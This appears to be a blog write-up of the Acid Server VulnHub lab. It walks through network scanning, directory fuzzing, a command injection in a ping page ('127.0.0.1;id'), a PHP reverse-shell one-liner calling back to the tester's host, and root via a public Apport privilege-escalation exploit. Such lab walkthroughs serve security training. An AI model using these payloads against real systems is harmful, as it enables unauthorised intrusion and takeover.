---
layout: post
title: "Acid Server"
date: 2016-09-03 12:56:03 -0500
comments: true
categories: 
---

##Tools:

* netdiscover
* Nmap
* Wfuzz
* DirBuster
* Burp


###Vulnerabilities:
[Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation](https://www.exploit-db.com/exploits/37088/)

<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.41.0/24`

{% img  /images/blog/vulhub/acid_server/Selection_001.png   [title manually exploit [alt text]] %}

192.168.41.170is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.41.170 -p-`

{% img  /images/blog/vulhub/acid_server/Selection_002.png   [title manually exploit [alt text]] %}

port 33447 is open and running http service.

run wfuzz,

`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.170:33447/FUZZ 2>/dev/null`

{% img  /images/blog/vulhub/acid_server/Selection_003.png   [title manually exploit [alt text]] %}

find a path `Challenge`

use DirBuster, check `http://192.168.41.170:33447/Challenge/`

{% img  /images/blog/vulhub/acid_server/Selection_004.png   [title manually exploit [alt text]] %}

Check cake.php

{% img  /images/blog/vulhub/acid_server/Selection_005.png   [title manually exploit [alt text]] %}

check source code,

{% img  /images/blog/vulhub/acid_server/Selection_006.png   [title manually exploit [alt text]] %}

find `/Magic_Box` may be a hidden path

{% img  /images/blog/vulhub/acid_server/Selection_007.png   [title manually exploit [alt text]] %}

use DirBuster again,

{% img  /images/blog/vulhub/acid_server/Selection_008.png   [title manually exploit [alt text]] %}

`command.php` looks interesting.

check that page:

{% img  /images/blog/vulhub/acid_server/Selection_009.png   [title manually exploit [alt text]] %}

type `127.0.0.1` and use Burp

looks like it pings the IP address I typed

`{% img  /images/blog/vulhub/acid_server/Selection_010.png   [title manually exploit [alt text]] %}`


now try `127.0.0.1;id`

`{% img  /images/blog/vulhub/acid_server/Selection_011.png   [title manually exploit [alt text]] %}`

works. So there is a command injection vulnerability.

In burp, instead of `id ` command, using (URL encode):

`php -r '$sock=fsockopen("192.168.41.149",443);exec("/bin/sh -i <&3 >&3 2>&3");'`


get the shell


`{% img  /images/blog/vulhub/acid_server/Selection_012.png   [title manually exploit [alt text]] %}`

`python -c 'import pty; pty.spawn("/bin/bash")'`


after some enumeration 

`cat /etc/*-release`

`{% img  /images/blog/vulhub/acid_server/Selection_013.png   [title manually exploit [alt text]] %}`

Target is running Ubuntu 15.04

`earchsploit ubuntu | grep 15.04`

`{% img  /images/blog/vulhub/acid_server/Selection_014.png   [title manually exploit [alt text]] %}`


Since the target doesn't have wget and gcc, I setup ftp srever and compile the code locally and upload it.

get root


`{% img  /images/blog/vulhub/acid_server/Selection_015.png   [title manually exploit [alt text]] %}`




